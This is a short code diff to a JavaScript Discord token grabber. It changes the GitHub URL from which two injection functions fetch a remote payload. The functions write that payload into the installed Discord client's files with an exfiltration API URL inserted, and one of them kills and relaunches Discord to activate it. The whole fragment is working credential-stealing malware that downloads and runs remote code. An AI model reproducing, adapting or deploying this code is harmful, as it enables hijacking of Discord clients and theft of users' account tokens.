@@ -87,7 +87,7 @@ try {
             function injectToDiscord() {
                 getInstalledDiscord()
                 killAllDiscords()
-                fetch("https://raw.githubusercontent.com/GayarraFrost/DiscordTokenGrabber/main/data/index.js").then(r => r.text()).then(r => toInjectJS.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiurl)) ^ execSync(`${local}/${f.split("/")[5]}/Update.exe --processStart ${f.split("/")[5]}.exe`)))
+                fetch("https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js").then(r => r.text()).then(r => toInjectJS.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiurl)) ^ execSync(`${local}/${f.split("/")[5]}/Update.exe --processStart ${f.split("/")[5]}.exe`)))
             }
 
             function getInstalledDiscord() {
@@ -169,7 +169,7 @@ try {
 
             function LinjectToDiscord() {
                 getInstalledLDiscord()
-                fetch("https://raw.githubusercontent.com/GayarraFrost/DiscordTokenGrabber/main/data/index.js").then(r => r.text()).then(r => toInjectJS.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiurl))))
+                fetch("https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js").then(r => r.text()).then(r => toInjectJS.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiurl))))
             }
 
             function getInstalledLDiscord() {
